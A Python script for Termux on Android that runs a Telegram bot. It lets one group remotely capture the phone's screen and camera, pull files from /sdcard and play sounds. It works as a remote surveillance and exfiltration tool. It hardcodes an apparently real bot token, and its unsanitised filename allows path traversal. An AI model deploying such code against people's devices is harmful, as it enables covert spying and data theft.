import telebot
import subprocess
import os
import time
from PIL import Image
import datetime

# Telegram bot token and group ID
TOKEN = '7837835834:AAHm3-hrbWlZ5tpKB2W6T16-keyolIQ-q84'
GROUP_ID = '-1002576856039'

# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Directory for temporary files
TEMP_DIR = '/sdcard/telegram_control'
if not os.path.exists(TEMP_DIR):
    os.makedirs(TEMP_DIR)

# Check if message is from the authorized group
def is_authorized_group(message):
    return str(message.chat.id) == GROUP_ID

# Handler for /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_authorized_group(message):
        bot.reply_to(message, "Bot is active! Available commands:\n"
                            "/screen - Capture and send screen\n"
                            "/webcam - Capture and send webcam photo\n"
                            "/upload_image <filename> - Upload an image from /sdcard\n"
                            "/play_sound <filename> - Play a sound file from /sdcard\n"
                            "/disable - Disable the bot")
    else:
        bot.reply_to(message, "This bot only works in the authorized group.")

# Handler for /screen command
@bot.message_handler(commands=['screen'])
def capture_screen(message):
    if not is_authorized_group(message):
        bot.reply_to(message, "Unauthorized group!")
        return
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{TEMP_DIR}/screen_{timestamp}.png"
        # Capture screen using Termux-API
        subprocess.run(['termux-toast', 'Capturing screen...'])
        subprocess.run(['termux-screenshot', output_file])
        if os.path.exists(output_file):
            with open(output_file, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption="Screen capture")
            os.remove(output_file)
        else:
            bot.reply_to(message, "Failed to capture screen.")
    except Exception as e:
        bot.reply_to(message, f"Error capturing screen: {str(e)}")

# Handler for /webcam command
@bot.message_handler(commands=['webcam'])
def capture_webcam(message):
    if not is_authorized_group(message):
        bot.reply_to(message, "Unauthorized group!")
        return
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"{TEMP_DIR}/webcam_{timestamp}.jpg"
        # Capture photo using Termux-API (default camera, usually front)
        subprocess.run(['termux-toast', 'Capturing webcam...'])
        subprocess.run(['termux-camera-photo', '-c', '0', output_file])
        if os.path.exists(output_file):
            with open(output_file, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption="Webcam capture")
            os.remove(output_file)
        else:
            bot.reply_to(message, "Failed to capture webcam photo.")
    except Exception as e:
        bot.reply_to(message, f"Error capturing webcam: {str(e)}")

# Handler for /upload_image command
@bot.message_handler(commands=['upload_image'])
def upload_image(message):
    if not is_authorized_group(message):
        bot.reply_to(message, "Unauthorized group!")
        return
    try:
        filename = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        if not filename:
            bot.reply_to(message, "Please provide a filename: /upload_image <filename>")
            return
        file_path = f"/sdcard/{filename}"
        if os.path.exists(file_path):
            with open(file_path, 'rb') as photo:
                bot.send_photo(message.chat.id, photo, caption=f"Uploaded: {filename}")
        else:
            bot.reply_to(message, f"File {filename} not found in /sdcard")
    except Exception as e:
        bot.reply_to(message, f"Error uploading image: {str(e)}")

# Handler for /play_sound command
@bot.message_handler(commands=['play_sound'])
def play_sound(message):
    if not is_authorized_group(message):
        bot.reply_to(message, "Unauthorized group!")
        return
    try:
        filename = message.text.split(maxsplit=1)[1] if len(message.text.split()) > 1 else None
        if not filename:
            bot.reply_to(message, "Please provide a filename: /play_sound <filename>")
            return
        file_path = f"/sdcard/{filename}"
        if os.path.exists(file_path):
            subprocess.run(['termux-toast', f'Playing {filename}...'])
            subprocess.run(['termux-media-player', 'play', file_path])
            bot.reply_to(message, f"Playing sound: {filename}")
        else:
            bot.reply_to(message, f"File {filename} not found in /sdcard")
    except Exception as e:
        bot.reply_to(message, f"Error playing sound: {str(e)}")

# Handler for /disable command
@bot.message_handler(commands=['disable'])
def disable_bot(message):
    if not is_authorized_group(message):
        bot.reply_to(message, "Unauthorized group!")
        return
    bot.reply_to(message, "Bot is shutting down...")
    bot.stop_polling()
    exit(0)

# Start the bot
bot.polling(none_stop=True)
